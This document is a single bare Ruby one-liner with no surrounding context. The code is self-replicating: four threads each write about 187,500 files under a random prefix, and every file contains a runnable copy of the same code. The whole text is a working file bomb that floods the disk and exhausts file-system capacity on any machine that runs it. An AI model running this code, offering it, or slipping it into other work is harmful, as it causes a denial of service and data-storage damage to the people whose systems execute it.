@s='def j; a,b=[*("A".."Z")].sample(3).join,0; while b<187500; File.open(a+b.to_s,"w") {|f| f.write("@s=\'"+@s+"\';eval @s") }; b=b+1; end end; t=[]; 4.times{t<<Thread.new{j}}; t.each(&:join)';eval @s